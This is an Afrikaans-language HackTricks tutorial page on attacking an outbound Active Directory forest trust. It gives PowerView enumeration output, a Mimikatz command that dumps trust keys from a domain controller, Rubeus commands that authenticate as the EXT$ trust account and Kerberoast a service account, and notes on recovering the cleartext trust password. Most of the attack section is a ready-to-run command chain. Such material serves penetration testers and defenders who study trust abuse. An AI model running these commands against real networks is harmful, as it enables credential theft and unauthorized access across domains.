# Eksterne Bos Domein - Eenrigting (Uitgaande)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

In hierdie scenario **vertrou jou domein** sekere **voorregte** toe aan 'n **hoof van 'n ander domein**.

## Opname

### Uitgaande Vertroue
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Vertrouensrekening Aanval

'n Sekuriteitskwesbaarheid bestaan wanneer 'n vertrouensverhouding gevestig word tussen twee domeine, hier geïdentifiseer as domein **A** en domein **B**, waar domein **B** sy vertroue na domein **A** uitbrei. In hierdie opstelling word 'n spesiale rekening geskep in domein **A** vir domein **B**, wat 'n belangrike rol speel in die verifikasieproses tussen die twee domeine. Hierdie rekening, geassosieer met domein **B**, word gebruik om kaartjies te enkripteer vir die toegang tot dienste regoor die domeine.

Die kritieke aspek om hier te verstaan is dat die wagwoord en has van hierdie spesiale rekening uit 'n Domeinbeheerder in domein **A** geëkstraheer kan word met behulp van 'n opdraglynwerktuig. Die opdrag om hierdie aksie uit te voer is:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Hierdie uittreksel is moontlik omdat die rekening, geïdentifiseer met 'n **$** na sy naam, aktief is en behoort tot die "Domain Users" groep van domein **A**, en sodoende toestemmings wat met hierdie groep geassosieer word, erf. Dit maak dit vir individue moontlik om teen domein **A** te verifieer deur die geloofsbriewe van hierdie rekening te gebruik.

**Waarskuwing:** Dit is moontlik om hierdie situasie te benut om 'n voet in domein **A** as 'n gebruiker te kry, alhoewel met beperkte toestemmings. Hierdie toegang is egter voldoende om opname op domein **A** uit te voer.

In 'n scenario waar `ext.local` die vertrouende domein is en `root.local` die vertroude domein is, sou 'n gebruikersrekening genaamd `EXT$` binne `root.local` geskep word. Deur spesifieke gereedskap te gebruik, is dit moontlik om die Kerberos-vertrouensleutels te dump, wat die geloofsbriewe van `EXT$` in `root.local` onthul. Die bevel om dit te bereik is:
```bash
lsadump::trust /patch
```
Volgens hierdie kan 'n persoon die onttrekte RC4-sleutel gebruik om as `root.local\EXT$` te verifieer binne `root.local` deur 'n ander gereedskapopdrag te gebruik:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Hierdie verifikasie stap maak dit moontlik om dienste binne `root.local` te ontleed en selfs te benut, soos die uitvoer van 'n Kerberoast-aanval om diensrekeningkredensiale te onttrek met behulp van:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Versameling van teksvertrouwenswagwoord

In die vorige stroom is die vertrouenshash gebruik in plaas van die **duidelike teks wagwoord** (wat ook **deur mimikatz uitgelek** is).

Die duidelike wagwoord kan verkry word deur die \[ CLEAR ] uitset van mimikatz vanaf heksadesimaal te omskep en nulbyte ' \x00 ' te verwyder:

![](<../../.gitbook/assets/image (938).png>)

Soms moet 'n wagwoord deur die gebruiker ingetik word vir die vertroue wanneer 'n vertrouensverhouding geskep word. In hierdie demonstrasie is die sleutel die oorspronklike vertrouenswagwoord en dus menslik leesbaar. Aangesien die sleutel siklus (30 dae) is, sal die duidelike teks nie menslik leesbaar wees nie, maar tegnies steeds bruikbaar wees.

Die duidelike wagwoord kan gebruik word om gereelde verifikasie uit te voer as die vertrouensrekening, 'n alternatief vir die versoek van 'n TGT deur die Kerberos-geheimsleutel van die vertrouensrekening te gebruik. Hier word navraag gedoen na root.local vanaf ext.local vir lede van Domain Admins:

![](<../../.gitbook/assets/image (792).png>)

## Verwysings

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
